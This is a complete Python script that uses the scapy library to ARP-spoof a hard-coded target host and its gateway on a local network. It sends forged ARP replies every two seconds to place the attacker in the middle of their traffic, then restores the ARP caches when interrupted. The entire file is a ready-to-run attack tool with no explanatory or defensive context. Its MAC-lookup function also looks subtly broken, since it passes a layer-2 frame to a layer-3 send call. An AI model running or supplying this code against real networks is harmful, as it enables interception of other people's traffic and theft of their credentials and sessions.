import scapy.all as sc
import time

def arp_spoof(target_ip, spoofed_ip, target_mac):
    packet = sc.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoofed_ip)
    sc.send(packet, verbose=False)

def get_mac_adress(ip):
    ans = sc.sr1(sc.Ether(dst="ff:ff:ff:ff:ff:ff")/sc.ARP(pdst=ip), timeout=2, verbose=False)
    if ans:
        return ans.hwsrc
    return None

target_ip = "192.168.1.5"
gateway_ip = "192.168.1.1"

target_mac = get_mac_adress(target_ip)
gateway_mac = get_mac_adress(gateway_ip)

try:
    while True:
        arp_spoof(target_ip, gateway_ip, target_mac)
        arp_spoof(gateway_ip, target_ip, gateway_mac)
        time.sleep(2)
except KeyboardInterrupt:
    sc.send(sc.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac), count=3, verbose=False)
    sc.send(sc.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac), count=3, verbose=False)